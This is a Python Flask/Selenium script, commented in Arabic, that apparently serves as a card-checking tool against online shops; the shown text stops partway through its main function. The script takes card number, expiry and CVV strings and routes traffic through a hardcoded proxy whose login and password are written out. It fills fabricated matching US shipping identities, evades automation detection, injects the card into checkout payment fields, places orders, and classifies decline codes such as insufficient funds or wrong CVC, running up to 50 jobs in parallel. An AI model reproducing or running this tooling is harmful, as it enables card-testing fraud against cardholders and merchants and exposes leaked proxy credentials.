# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة
import time
import re
import json
import requests
from urllib.parse import urljoin
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from flask import Flask, request, jsonify
import os
import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import random

app = Flask(__name__)

# ==================== إعدادات الأداء ====================
MAX_WORKERS = 50
REQUEST_TIMEOUT = 60
TASK_QUEUE = queue.Queue()
executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ==================== نظام توليد عناوين أمريكية متطابقة ====================
# قوائم بيانات متطابقة: الاسم الأول + اسم العائلة + المدينة + الولاية + zip كلها متناسقة
MATCHED_ADDRESSES = [
    {
        "first_name": "James", "last_name": "Smith", "full_name": "James Smith",
        "address1": "1200 Main St", "city": "New York", "state": "New York", "zip": "10001",
        "phone": "2125550101", "email_domain": "gmail.com"
    },
    {
        "first_name": "Mary", "last_name": "Johnson", "full_name": "Mary Johnson",
        "address1": "2500 Oak Ave", "city": "Los Angeles", "state": "California", "zip": "90001",
        "phone": "2135550202", "email_domain": "yahoo.com"
    },
    {
        "first_name": "Robert", "last_name": "Williams", "full_name": "Robert Williams",
        "address1": "3800 Maple Dr", "city": "Chicago", "state": "Illinois", "zip": "60601",
        "phone": "3125550303", "email_domain": "outlook.com"
    },
    {
        "first_name": "Patricia", "last_name": "Brown", "full_name": "Patricia Brown",
        "address1": "4500 Cedar Ln", "city": "Houston", "state": "Texas", "zip": "77001",
        "phone": "7135550404", "email_domain": "hotmail.com"
    },
    {
        "first_name": "John", "last_name": "Jones", "full_name": "John Jones",
        "address1": "5200 Elm St", "city": "Phoenix", "state": "Arizona", "zip": "85001",
        "phone": "6025550505", "email_domain": "protonmail.com"
    },
    {
        "first_name": "Jennifer", "last_name": "Garcia", "full_name": "Jennifer Garcia",
        "address1": "6800 Washington Ave", "city": "Philadelphia", "state": "Pennsylvania", "zip": "19101",
        "phone": "2155550606", "email_domain": "icloud.com"
    },
    {
        "first_name": "Michael", "last_name": "Miller", "full_name": "Michael Miller",
        "address1": "7500 Park Ave", "city": "San Antonio", "state": "Texas", "zip": "78201",
        "phone": "2105550707", "email_domain": "mail.com"
    },
    {
        "first_name": "Linda", "last_name": "Davis", "full_name": "Linda Davis",
        "address1": "8100 Lake Dr", "city": "San Diego", "state": "California", "zip": "92101",
        "phone": "6195550808", "email_domain": "aol.com"
    },
    {
        "first_name": "William", "last_name": "Rodriguez", "full_name": "William Rodriguez",
        "address1": "9300 Hill St", "city": "Dallas", "state": "Texas", "zip": "75201",
        "phone": "2145550909", "email_domain": "yandex.com"
    },
    {
        "first_name": "Elizabeth", "last_name": "Martinez", "full_name": "Elizabeth Martinez",
        "address1": "10400 Pine St", "city": "Austin", "state": "Texas", "zip": "73301",
        "phone": "5125551010", "email_domain": "zoho.com"
    },
    {
        "first_name": "David", "last_name": "Hernandez", "full_name": "David Hernandez",
        "address1": "11500 Church St", "city": "Jacksonville", "state": "Florida", "zip": "32099",
        "phone": "9045551111", "email_domain": "fastmail.com"
    },
    {
        "first_name": "Barbara", "last_name": "Lopez", "full_name": "Barbara Lopez",
        "address1": "12800 Market St", "city": "Fort Worth", "state": "Texas", "zip": "76101",
        "phone": "8175551212", "email_domain": "tutanota.com"
    },
    {
        "first_name": "Richard", "last_name": "Wilson", "full_name": "Richard Wilson",
        "address1": "13900 Bridge St", "city": "Columbus", "state": "Ohio", "zip": "43004",
        "phone": "6145551313", "email_domain": "gmail.com"
    },
    {
        "first_name": "Susan", "last_name": "Anderson", "full_name": "Susan Anderson",
        "address1": "15000 River Rd", "city": "Charlotte", "state": "North Carolina", "zip": "28201",
        "phone": "7045551414", "email_domain": "yahoo.com"
    },
    {
        "first_name": "Joseph", "last_name": "Thomas", "full_name": "Joseph Thomas",
        "address1": "16200 Forest Ave", "city": "San Francisco", "state": "California", "zip": "94101",
        "phone": "4155551515", "email_domain": "outlook.com"
    },
    {
        "first_name": "Jessica", "last_name": "Taylor", "full_name": "Jessica Taylor",
        "address1": "17500 Valley Rd", "city": "Indianapolis", "state": "Indiana", "zip": "46201",
        "phone": "3175551616", "email_domain": "hotmail.com"
    },
    {
        "first_name": "Thomas", "last_name": "Moore", "full_name": "Thomas Moore",
        "address1": "18800 Mountain Ave", "city": "Seattle", "state": "Washington", "zip": "98101",
        "phone": "2065551717", "email_domain": "protonmail.com"
    },
    {
        "first_name": "Sarah", "last_name": "Jackson", "full_name": "Sarah Jackson",
        "address1": "19900 Sunset Blvd", "city": "Denver", "state": "Colorado", "zip": "80201",
        "phone": "3035551818", "email_domain": "icloud.com"
    },
    {
        "first_name": "Charles", "last_name": "Martin", "full_name": "Charles Martin",
        "address1": "21200 Highland Ave", "city": "Washington", "state": "District of Columbia", "zip": "20001",
        "phone": "2025551919", "email_domain": "mail.com"
    },
    {
        "first_name": "Karen", "last_name": "Lee", "full_name": "Karen Lee",
        "address1": "22500 Grove St", "city": "Boston", "state": "Massachusetts", "zip": "02101",
        "phone": "6175552020", "email_domain": "aol.com"
    },
]

# قائمة إضافية للأسماء فقط (للتبديل إن لزم)
FIRST_NAMES = ['James', 'Mary', 'John', 'Patricia', 'Robert', 'Jennifer', 'Michael', 'Linda', 'William', 'Elizabeth',
               'David', 'Barbara', 'Richard', 'Susan', 'Joseph', 'Jessica', 'Thomas', 'Sarah', 'Charles', 'Karen',
               'Anthony', 'Lisa', 'Matthew', 'Nancy', 'Daniel', 'Betty', 'Paul', 'Helen', 'Mark', 'Sandra',
               'Donald', 'Donna', 'George', 'Carol', 'Kenneth', 'Ruth', 'Steven', 'Sharon', 'Edward', 'Michelle',
               'Brian', 'Laura', 'Ronald', 'Kimberly', 'Kevin', 'Deborah', 'Jason', 'Emily', 'Jeffrey', 'Amanda']

LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez',
              'Hernandez', 'Lopez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin', 'Lee',
              'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark', 'Ramirez', 'Lewis', 'Robinson', 'Walker']

STREET_NAMES = ['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Elm St', 'Washington Ave', 'Park Ave', 'Lake Dr',
                'Hill St', 'Pine St', 'Church St', 'Market St', 'Bridge St', 'River Rd', 'Forest Ave',
                'Valley Rd', 'Mountain Ave', 'Sunset Blvd', 'Highland Ave', 'Grove St']

def generate_matched_shipping_data():
    """
    توليد بيانات شحن أمريكية متطابقة بالكامل
    الاسم، المدينة، الولاية، zip كلها متناسقة من قائمة MATCHED_ADDRESSES
    """
    address = random.choice(MATCHED_ADDRESSES).copy()
    
    # إضافة تنسيق إضافي عشوائي للبريد الإلكتروني
    username = f"{address['first_name'].lower()}{address['last_name'].lower()}{random.randint(1, 999)}"
    address["email"] = f"{username}@{address['email_domain']}"
    
    return address

def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
    """
    طريقة استخراج جديدة - تعطي أولوية للـ codes التي تحتوي على شرطة سفلية _
    إذا لم يتم العثور على أي code يحتوي على _ ، ينتقل إلى __typename
    """
    
    # تصفية الكودات المستبعدة أولاً
    valid_codes = []
    for code in all_codes:
        is_excluded = False
        for excluded in excluded_codes:
            if excluded in code:
                is_excluded = True
                break
        if not is_excluded:
            valid_codes.append(code)
    
    # المرحلة 1: البحث عن codes تحتوي على شرطة سفلية _
    underscore_codes = [code for code in valid_codes if '_' in code]
    
    # استبعاد patterns غير المرغوب فيها حتى لو كانت تحتوي على _
    unwanted_patterns = [
        'Free_Postal_Shipping', 'UPS_', 'Economy_', 'First_', 'Standard_', 'Priority_',
        'GroundAdvantage_', 'MediaMail_', 'Flat_', 'Shipping_', 'Express_',
        'PrivacyBannerSettingsBulletPoints_', 'UiExtension_', 'fedex_ground_economy_',
        'CAMP_', 'by-items_', 'DELIVERY_', 'PAYMENTS_', 'BUYER_', 'REQUIRED_', 'WAITING_'
    ]
    
    filtered_underscore_codes = []
    for code in underscore_codes:
        is_unwanted = False
        for pattern in unwanted_patterns:
            if pattern in code:
                is_unwanted = True
                break
        if not is_unwanted:
            filtered_underscore_codes.append(code)
    
    # إذا وجدنا codes تحتوي على _ بعد التصفية، نعيد أول واحد
    if filtered_underscore_codes:
        return filtered_underscore_codes[0], None
    
    # المرحلة 2: إذا لم نجد codes تحتوي على _ ، نبحث في __typename عن ما يحتوي على _
    if all_typenames:
        typename_underscore = [t for t in all_typenames if '_' in t]
        filtered_typename_underscore = []
        for t in typename_underscore:
            is_unwanted = False
            for pattern in unwanted_patterns:
                if pattern in t:
                    is_unwanted = True
                    break
            if not is_unwanted:
                filtered_typename_underscore.append(t)
        
        if filtered_typename_underscore:
            return filtered_typename_underscore[0], filtered_typename_underscore[0]
    
    # المرحلة 3: إذا لم نجد أي شيء يحتوي على _ ، نرجع أول code عادي صالح
    if valid_codes:
        return valid_codes[0], None
    
    # المرحلة 4: كملاذ أخير، نرجع أول typename
    if all_typenames:
        return all_typenames[0], all_typenames[0]
    
    return None, None

def ff(ccx, site):
    """
    ccx: رقم البطاقة|الشهر|السنة|cvv
    مثال: '4918460118934875|08|2027|293'
    site: رابط الموقع
    مثال: 'https://www.militadowatch.com/'
    """
    
    # ==================== توليد بيانات شحن متطابقة ====================
    shipping_data = generate_matched_shipping_data()
    
    parts = ccx.split('|')
    if len(parts) != 4:
        return {"success": False, "code": None, "error": "Invalid card format"}
    
    card_data = {
        "number": parts[0].strip(),
        "expiry": f"{parts[1].strip()}/{parts[2].strip()[-2:]}",
        "cvv": parts[3].strip(),
        "name": shipping_data["full_name"]
    }
    
    found_code = None
    found_typename = None
    total_amount = "$1.00"
    base_url = site.rstrip('/')
    response_result = None
    is_3ds = False
    order_confirmed = False
    checkout_url = None
    final_url = None
    order_number = None
    payment_status = None
    
    # ==================== 1. جلب رابط الدفع ====================
    try:
        proxy = "px440401.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
        ip, port, user, pwd = proxy.split(":")
        proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
        proxies = {"http": proxy_url, "https": proxy_url}
        
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        
        digital_keywords = [
            'worry-free', 'protection', 'insurance', 'warranty', 'digital', 
            'download', 'ebook', 'pdf', 'gift card', 'membership', 'subscription',
            'service', 'guarantee', 'support'
        ]
        
        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=10)
        if r.status_code != 200:
            return {"success": False, "code": None, "error": "Failed to fetch products"}
        
        products_data = r.json()
        shippable_products = []
        
        for p in products_data.get('products', []):
            title = p.get('title', '').lower()
            product_type = p.get('product_type', '').lower()
            vendor = p.get('vendor', '').lower()
            
            is_digital = False
            for keyword in digital_keywords:
                if keyword in title or keyword in product_type or keyword in vendor:
                    is_digital = True
                    break
            
            if is_digital:
                continue
            
            for v in p.get('variants', []):
                price = float(v.get('price', 0))
                available = v.get('available', True)
                if price > 0 and available and price >= 1.0:
                    shippable_products.append({
                        'title': p.get('title'),
                        'price': price,
                        'variant_id': v.get('id'),
                        'handle': p.get('handle')
                    })
        
        if not shippable_products:
            return {"success": False, "code": None, "error": "No shippable product"}
        
        cheapest = min(shippable_products, key=lambda x: x['price'])
        variant_id = cheapest['variant_id']
        total_amount = f"${cheapest['price']:.2f}"
        
        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=10)
        if resp.status_code != 200:
            return {"success": False, "code": None, "error": "Failed to add to cart"}
        
        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=10)
        checkout_url = response.url
        
    except Exception as e:
        return {"success": False, "code": None, "error": str(e)}
    
    # ==================== 2. تشغيل المتصفح ====================
    driver = None
    try:
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        chrome_options.add_argument('--disable-web-security')
        chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
        chrome_options.add_argument('--disable-popup-blocking')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--disable-notifications')
        chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
        
        driver = webdriver.Chrome(options=chrome_options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        wait = WebDriverWait(driver, 15)
        driver.set_page_load_timeout(25)
        
        driver.get(checkout_url)
        time.sleep(2)
        
        # ==================== 3. تعبئة الشحن ====================
        try:
            email_field = wait.until(EC.presence_of_element_located((By.ID, "email")))
            email_field.clear()
            email_field.send_keys(shipping_data["email"])
            time.sleep(1.5)
            
            try:
                country_select = driver.find_element(By.NAME, "countryCode")
                current_country = country_select.get_attribute('value')
                if current_country != "US":
                    Select(country_select).select_by_value("US")
                    time.sleep(0.5)
            except:
                pass
            
            fields = {
                "firstName": shipping_data["first_name"],
                "lastName": shipping_data["last_name"],
                "address1": shipping_data["address1"],
                "city": shipping_data["city"],
                "postalCode": shipping_data["zip"],
                "phone": shipping_data["phone"]
            }
            
            for field_name, value in fields.items():
                try:
                    element = driver.find_element(By.NAME, field_name)
                    element.clear()
                    element.send_keys(value)
                except:
                    pass
            
            try:
                state_select = Select(driver.find_element(By.NAME, "zone"))
                state_select.select_by_visible_text(shipping_data["state"])
            except:
                try:
                    state_input = driver.find_element(By.NAME, "zone")
                    state_input.clear()
                    state_input.send_keys(shipping_data["state"])
                    state_input.send_keys(Keys.ENTER)
                except:
                    pass
            
            time.sleep(0.5)
            continue_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']")))
            driver.execute_script("arguments[0].click();", continue_btn)
            time.sleep(2)
            
        except:
            return {"success": False, "code": None, "error": "Shipping fill failed"}
        
        # ==================== 4. تعبئة الدفع ====================
        try:
            driver.switch_to.default_content()
            time.sleep(0.5)
            
            iframes = driver.find_elements(By.TAG_NAME, 'iframe')
            
            card_filled = False
            expiry_filled = False
            cvv_filled = False
            name_filled = False
            
            for iframe in iframes:
                try:
                    driver.switch_to.frame(iframe)
                    inputs = driver.find_elements(By.TAG_NAME, 'input')
                    
                    for input_elem in inputs:
                        data_field = input_elem.get_attribute('data-field') or ''
                        placeholder = input_elem.get_attribute('placeholder') or ''
                        autocomplete = input_elem.get_attribute('autocomplete') or ''
                        input_id = input_elem.get_attribute('id') or ''
                        
                        if not card_filled and (data_field == 'number' or 'card number' in placeholder.lower() or autocomplete == 'cc-number'):
                            driver.execute_script("""
                                arguments[0].focus();
                                arguments[0].value = '';
                                arguments[0].value = arguments[1];
                                arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                            """, input_elem, card_data["number"])
                            card_filled = True
                            time.sleep(0.2)
                        
                        elif not expiry_filled and (data_field == 'expiry' or 'expiry' in placeholder.lower() or autocomplete == 'cc-exp'):
                            driver.execute_script("""
                                arguments[0].focus();
                                arguments[0].value = '';
                                arguments[0].value = arguments[1];
                                arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                            """, input_elem, card_data["expiry"])
                            expiry_filled = True
                            time.sleep(0.2)
                        
                        elif not cvv_filled and (data_field == 'cvv' or 'cvv' in placeholder.lower() or autocomplete == 'cc-csc'):
                            driver.execute_script("""
                                arguments[0].focus();
                                arguments[0].value = '';
                                arguments[0].value = arguments[1];
                                arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                            """, input_elem, card_data["cvv"])
                            cvv_filled = True
                            time.sleep(0.2)
                        
                        elif not name_filled and (data_field == 'name' or 'name' in placeholder.lower() or autocomplete == 'cc-name'):
                            driver.execute_script("""
                                arguments[0].focus();
                                arguments[0].value = '';
                                arguments[0].value = arguments[1];
                                arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
                                arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                            """, input_elem, card_data["name"])
                            name_filled = True
                            time.sleep(0.2)
                    
                    driver.switch_to.default_content()
                    
                    if card_filled and expiry_filled and cvv_filled and name_filled:
                        break
                        
                except:
                    driver.switch_to.default_content()
                    continue
            
            if not (card_filled and expiry_filled and cvv_filled and name_filled):
                return {"success": False, "code": None, "error": "Payment fill failed"}
            
        except:
            return {"success": False, "code": None, "error": "Payment error"}
        
        # ==================== 5. اعتراض GraphQL ====================
        try:
            script = """
            window.graphqlResponses = [];
            window.allResponses = [];
            window.pageUrls = [];
            
            var originalFetch = window.fetch;
            window.fetch = function(url, options) {
                return originalFetch.apply(this, arguments).then(function(response) {
                    var clone = response.clone();
                    clone.text().then(function(text) {
                        var data = {
                            url: url,
                            body: text,
                            timestamp: new Date().toISOString()
                        };
                        window.allResponses.push(data);
                        if (url && url.includes('/checkouts/internal/graphql/persisted')) {
                            window.graphqlResponses.push(data);
                        }
                    });
                    return response;
                });
            };
            
            var originalXHROpen = XMLHttpRequest.prototype.open;
            var originalXHRSend = XMLHttpRequest.prototype.send;
            
            XMLHttpRequest.prototype.open = function(method, url) {
                this._url = url;
                return originalXHROpen.apply(this, arguments);
            };
            
            XMLHttpRequest.prototype.send = function(body) {
                var self = this;
                this.addEventListener('load', function() {
                    try {
                        var text = self.responseText;
                        var data = {
                            url: self._url,
                            body: text,
                            timestamp: new Date().toISOString()
                        };
                        window.allResponses.push(data);
                        if (self._url && self._url.includes('/checkouts/internal/graphql/persisted')) {
                            window.graphqlResponses.push(data);
                        }
                    } catch(e) {}
                });
                return originalXHRSend.apply(this, arguments);
            };
            
            var originalPushState = history.pushState;
            history.pushState = function(state, title, url) {
                window.pageUrls.push(url);
                return originalPushState.apply(this, arguments);
            };
            """
            driver.execute_script(script)
            time.sleep(0.5)
            
            # ==================== 6. الضغط على Pay ====================
            driver.switch_to.default_content()
            time.sleep(1)
            
            pay_selectors = [
                "//button[contains(text(), 'Pay now')]",
                "//button[contains(text(), 'Pay') and not(contains(text(), 'Pal'))]",
                "//button[contains(text(), 'Complete order')]",
                "//button[contains(text(), 'Place order')]",
                "//button[@type='submit']"
            ]
            
            pay_button = None
            for xpath in pay_selectors:
                try:
                    buttons = driver.find_elements(By.XPATH, xpath)
                    for button in buttons:
                        if button.is_displayed() and button.is_enabled():
                            pay_button = button
                            break
                    if pay_button:
                        break
                except:
                    continue
            
            if pay_button:
                driver.execute_script("arguments[0].click();", pay_button)
            else:
                driver.execute_script("""
                    var buttons = document.querySelectorAll('button[type="submit"]');
                    for (var i = 0; i < buttons.length; i++) {
                        var text = buttons[i].textContent || '';
                        if (text.includes('Pay now') || text.includes('Pay') || text.includes('Complete') || text.includes('Place order')) {
                            buttons[i].click();
                            return true;
                        }
                    }
                """)
            
            # ==================== 7. استخراج الكود ====================
            found_code = None
            found_typename = None
            all_codes = []
            all_typenames = []
            is_3ds = False
            order_confirmed = False
            order_number = None
            payment_status = None
            
            excluded_codes = [
                'REQUIRED_ARTIFACTS_UNAVAILABLE',
                'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT',
                'BUYER_IDENTITY_MISSING_CONTACT_METHOD',
                'PAYMENTS_ADDRESS1_REQUIRED',
                'PAYMENTS_LAST_NAME_REQUIRED',
                'PAYMENTS_FIRST_NAME_REQUIRED',
                'PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY',
                'PAYMENTS_POSTAL_CODE_REQUIRED',
                'DELIVERY_ZONE_REQUIRED_FOR_COUNTRY',
                'DELIVERY_POSTAL_CODE_REQUIRED',
                'PAYMENTS_CITY_REQUIRED',
                'WAITING_PENDING_TERMS',
                'Free Postal Shipping',
                'UPS',
                'DELIVERY_PHONE_NUMBER_REQUIRED',
             'Economy',
             'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
            'First', 
            'by-items', 
            'Standard', 
            'Priority', 
            'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
            'GroundAdvantage', 
            'MediaMail'
           
             
            ]
            
            for attempt in range(10):
                time.sleep(1.5)
                
                responses = driver.execute_script("return window.allResponses || [];")
                current_url = driver.current_url
                final_url = current_url
                
                page_urls = driver.execute_script("return window.pageUrls || [];")
                
                if '/thank_you' in current_url:
                    order_confirmed = True
                    found_code = 'ORDER_CONFIRMED'
                    response_result = 'Order confirmed - Thank you for your purchase!'
                    order_match = re.search(r'order_([A-Z0-9]+)', current_url, re.IGNORECASE)
                    if order_match:
                        order_number = order_match.group(1)
                    break
                
                try:
                    page_source = driver.page_source
                    if 'thank-you' in current_url or 'thank_you' in current_url:
                        order_confirmed = True
                        found_code = 'ORDER_CONFIRMED'
                        response_result = 'Order confirmed - Thank you for your purchase!'
                        break
                    
                    if 'Your order is confirmed' in page_source or 'Thank you for your purchase!' in page_source:
                        order_confirmed = True
                        found_code = 'ORDER_CONFIRMED'
                        response_result = 'Order confirmed - Thank you for your purchase!'
                        order_match = re.search(r'Order #?([A-Z0-9]+)', page_source, re.IGNORECASE)
                        if order_match:
                            order_number = order_match.group(1)
                        break
                    
                    if 'Thank you for your order' in page_source or 'thank you for your order' in page_source.lower():
                        order_confirmed = True
                        found_code = 'ORDER_CONFIRMED'
                        response_result = 'Order confirmed - Thank you for your purchase!'
                        order_match = re.search(r'Order #?([A-Z0-9]+)', page_source, re.IGNORECASE)
                        if order_match:
                            order_number = order_match.group(1)
                        break
                    
                    order_match = re.search(r'Order #?([A-Z0-9]+)', page_source, re.IGNORECASE)
                    if order_match:
                        order_number = order_match.group(1)
                        
                except:
                    pass
                
                for resp in responses:
                    body = resp.get('body', '')
                    url = resp.get('url', '')
                    
                    if not body:
                        continue
                    
                    if '/thank_you' in body or 'thank_you' in url:
                        order_confirmed = True
                        found_code = 'ORDER_CONFIRMED'
                        response_result = 'Order confirmed - Thank you for your purchase!'
                        break
                    
                    if f"{base_url}/thank_you" in body or f"{base_url}/post_purchase" in body:
                        order_confirmed = True
                        found_code = 'ORDER_CONFIRMED'
                        response_result = 'Order confirmed - Thank you for your purchase!'
                        break
                    
                    if 'Your order is confirmed' in body or 'Order confirmed' in body or 'order confirmed' in body.lower():
                        order_confirmed = True
                        found_code = 'ORDER_CONFIRMED'
                        response_result = 'Order confirmed - Thank you for your purchase!'
                        order_match = re.search(r'Order #?([A-Z0-9]+)', body, re.IGNORECASE)
                        if order_match:
                            order_number = order_match.group(1)
                        break
                    
                    if 'Thank you for your order' in body or 'thank you for your order' in body.lower():
                        order_confirmed = True
                        found_code = 'ORDER_CONFIRMED'
                        response_result = 'Order confirmed - Thank you for your purchase!'
                        order_match = re.search(r'Order #?([A-Z0-9]+)', body, re.IGNORECASE)
                        if order_match:
                            order_number = order_match.group(1)
                        break
                    
                    if '/persisted' in url and 'CompletePaymentChallenge' in body:
                        try:
                            data = json.loads(body)
                            if 'data' in data and 'receipt' in data['data']:
                                receipt = data['data']['receipt']
                                if 'action' in receipt:
                                    action = receipt['action']
                                    if action.get('__typename') == 'CompletePaymentChallenge':
                                        is_3ds = True
                                        found_code = '3DS_REQUIRED'
                                        found_typename = 'CompletePaymentChallenge'
                                        response_result = '3DS Secure required - Please complete authentication'
                                        break
                        except:
                            pass
                    
                    pattern = r'"code"\s*:\s*"([^"]+)"'
                    matches = re.findall(pattern, body, re.IGNORECASE)
                    for code in matches:
                        if len(code) > 3 and len(code) < 80 and ' ' not in code:
                            is_excluded = False
                            for excluded in excluded_codes:
                                if excluded in code:
                                    is_excluded = True
                                    break
                            if not is_excluded and code not in all_codes:
                                all_codes.append(code)
                    
                    if '__typename' in body:
                        pattern = r'"__typename"\s*:\s*"([^"]+)"'
                        matches = re.findall(pattern, body, re.IGNORECASE)
                        for typename in matches:
                            if len(typename) > 3 and len(typename) < 80:
                                if typename not in ['Query', 'Mutation', 'Subscription']:
                                    if typename not in all_typenames:
                                        all_typenames.append(typename)
                    
                    if 'processingError' in body:
                        try:
                            data = json.loads(body)
                            err = data.get('data', {}).get('receipt', {}).get('processingError', {})
                            if err:
                                code = err.get('code')
                                if code and len(code) > 3 and len(code) < 80:
                                    is_excluded = False
                                    for excluded in excluded_codes:
                                        if excluded in code:
                                            is_excluded = True
                                            break
                                    if not is_excluded and code not in all_codes:
                                        all_codes.append(code)
                                typename = err.get('__typename')
                                if typename and typename not in all_typenames:
                                    all_typenames.append(typename)
                                message = err.get('message', '')
                                if message:
                                    response_result = message
                        except:
                            pass
                    
                    if 'errors' in body:
                        try:
                            data = json.loads(body)
                            errors = data.get('errors', [])
                            for error in errors:
                                if isinstance(error, dict):
                                    code = error.get('code')
                                    if code and len(code) > 3 and len(code) < 80:
                                        is_excluded = False
                                        for excluded in excluded_codes:
                                            if excluded in code:
                                                is_excluded = True
                                                break
                                        if not is_excluded and code not in all_codes:
                                            all_codes.append(code)
                                    typename = error.get('__typename')
                                    if typename and typename not in all_typenames:
                                        all_typenames.append(typename)
                                    message = error.get('message', '')
                                    if message:
                                        response_result = message
                        except:
                            pass
                    
                    pattern = r'"status"\s*:\s*"([^"]+)"'
                    matches = re.findall(pattern, body, re.IGNORECASE)
                    for status in matches:
                        if len(status) > 3 and len(status) < 80 and ' ' not in status:
                            is_excluded = False
                            for excluded in excluded_codes:
                                if excluded in status:
                                    is_excluded = True
                                    break
                            if not is_excluded and status not in all_codes:
                                all_codes.append(status)
                    
                    if '/authentications/' in body or 'AUTHORIZATION_ERROR' in body:
                        if '3DS_REQUIRED' not in all_codes:
                            all_codes.append('3DS_REQUIRED')
                            response_result = '3DS Secure required'
                    
                    if 'INCORRECT_ZIP' in body:
                        if 'INCORRECT_ZIP' not in all_codes:
                            all_codes.append('INCORRECT_ZIP')
                            response_result = 'Incorrect ZIP'
                    if 'INSUFFICIENT_FUNDS' in body:
                        if 'INSUFFICIENT_FUNDS' not in all_codes:
                            all_codes.append('INSUFFICIENT_FUNDS')
                            response_result = 'Insufficient funds'
                    if 'INCORRECT_CVC' in body:
                        if 'INCORRECT_CVC' not in all_codes:
                            all_codes.append('INCORRECT_CVC')
                            response_result = 'INCORRECT_CVC'
                
                if found_code or order_confirmed:
                    break
                
                final_url = driver.current_url
            
            if not found_code and not all_codes and not order_confirmed:
                logs = driver.get_log('performance')
                for log in logs:
                    try:
                        message = json.loads(log['message'])
                        if message.get('message', {}).get('method') == 'Network.responseReceived':
                            url = message.get('message', {}).get('params', {}).get('response', {}).get('url', '')
                            if '/persisted' in url and 'graphql' in url:
                                request_id = message.get('message', {}).get('params', {}).get('requestId')
                                if request_id:
                                    try:
                                        response = driver.execute_cdp_cmd('Network.getResponseBody', {'requestId': request_id})
                                        body = response.get('body', '')
                                        if body:
                                            if 'CompletePaymentChallenge' in body:
                                                try:
                                                    data = json.loads(body)
                                                    if 'data' in data and 'receipt' in data['data']:
                                                        receipt = data['data']['receipt']
                                                        if 'action' in receipt:
                                                            action = receipt['action']
                                                            if action.get('__typename') == 'CompletePaymentChallenge':
                                                                is_3ds = True
                                                                found_code = '3DS_REQUIRED'
                                                                found_typename = 'CompletePaymentChallenge'
                                                                response_result = '3DS Secure required - Please complete authentication'
                                                                break
                                                except:
                                                    pass
                                            if not found_code:
                                                pattern = r'"code"\s*:\s*"([^"]+)"'
                                                matches = re.findall(pattern, body, re.IGNORECASE)
                                                for code in matches:
                                                    if len(code) > 3 and len(code) < 80 and ' ' not in code:
                                                        is_excluded = False
                                                        for excluded in excluded_codes:
                                                            if excluded in code:
                                                                is_excluded = True
                                                                break
                                                        if not is_excluded and code not in all_codes:
                                                            all_codes.append(code)
                                            if '__typename' in body:
                                                pattern = r'"__typename"\s*:\s*"([^"]+)"'
                                                matches = re.findall(pattern, body, re.IGNORECASE)
                                                for typename in matches:
                                                    if len(typename) > 3 and len(typename) < 80:
                                                        if typename not in ['Query', 'Mutation', 'Subscription']:
                                                            if typename not in all_typenames:
                                                                all_typenames.append(typename)
                                    except:
                                        pass
                    except:
                        continue
            
            try:
                final_url = driver.current_url
            except:
                pass
            
            if driver:
                driver.quit()
            
            # ==================== استخدام طريقة الاستخراج الجديدة ====================
            if order_confirmed:
                result_code = 'ORDER_CONFIRMED'
                result_typename = 'OrderConfirmed'
                if order_number:
                    response_result = f'Order confirmed - Order #{order_number}'
                else:
                    response_result = 'Order confirmed - Thank you for your purchase!'
            elif is_3ds or found_code == '3DS_REQUIRED':
                result_code = '3DS_REQUIRED'
                result_typename = found_typename or 'CompletePaymentChallenge'
            elif found_code == 'SUCCESS':
                result_code = 'SUCCESS'
                result_typename = found_typename
            elif found_code and found_code not in excluded_codes:
                result_code = found_code
                result_typename = found_typename
            else:
                # استخدام دالة الاستخراج الجديدة التي تعطي أولوية للـ codes التي تحتوي على _
